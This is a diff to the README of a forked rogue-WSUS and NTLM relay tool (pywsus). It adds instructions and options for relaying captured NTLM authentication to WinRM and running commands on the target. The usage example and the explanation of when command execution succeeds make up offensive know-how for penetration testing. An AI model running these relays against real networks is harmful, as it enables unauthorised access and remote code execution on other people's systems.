@@ -11,7 +11,7 @@ This fork adds NTLM capture plus HTTP, AD CS, SMB, and LDAP/LDAPS relay handling
 - HTTP/HTTPS authentication relay and AD CS `/certsrv/` validation or certificate issuance.
 - SMB authentication proof, share listing, and in-memory kept sessions.
 - LDAP/LDAPS authentication proof, RootDSE, Who Am I, and base-object validation.
-- WinRM is not implemented yet.
+- WinRM (WS-Management over HTTP) relay: authenticate the relayed identity and, where the target allows unencrypted messages, run a command.
 
 ## Install
 
@@ -85,6 +85,19 @@ python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' \
   -v
 ```
 
+WinRM relay (WS-Management over HTTP):
+
+```bash
+python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' \
+  --ntlm-mode relay-winrm \
+  --relay-target http://target.lab.local:5985/wsman \
+  --relay-action winrm-exec \
+  --winrm-command "whoami" \
+  --json-events relay-winrm.jsonl
+```
+
+`winrm-id` proves the relayed identity reaches and authenticates to WS-Management; `winrm-exec` opens a shell and runs `--winrm-command`. WinRM over HTTP (5985) encrypts messages with the NTLM session key by default, which a relay does not have — so command execution only works when the target has `AllowUnencrypted=true` **and** the relayed identity is a WinRM principal (local Administrators / Remote Management Users). Otherwise the relay authenticates and reports `WinRM requires message encryption`. HTTPS targets (`https://target:5986/wsman`) go through the same backend.
+
 LDAP base-object validation over LDAPS:
 
 ```bash
@@ -142,9 +155,10 @@ HTTP relay result  identity=DOMAIN\DC02$ ... authenticated=True validation=type3
 ## Useful Options
 
 ```text
---ntlm-mode {off,challenge-only,capture,relay-http,relay-smb,relay-ldap}
+--ntlm-mode {off,challenge-only,capture,relay-http,relay-winrm,relay-smb,relay-ldap}
 --relay-target URL
---relay-action {auth-only,adcs-certsrv,adcs-issue,list-shares,keep-session,ldap-rootdse,ldap-whoami,ldap-base-search}
+--relay-action {auth-only,adcs-certsrv,adcs-issue,list-shares,keep-session,ldap-rootdse,ldap-whoami,ldap-base-search,winrm-id,winrm-exec}
+--winrm-command CMD
 --relay-preflight
 --relay-adcs-marker TEXT
 --adcs-template NAME
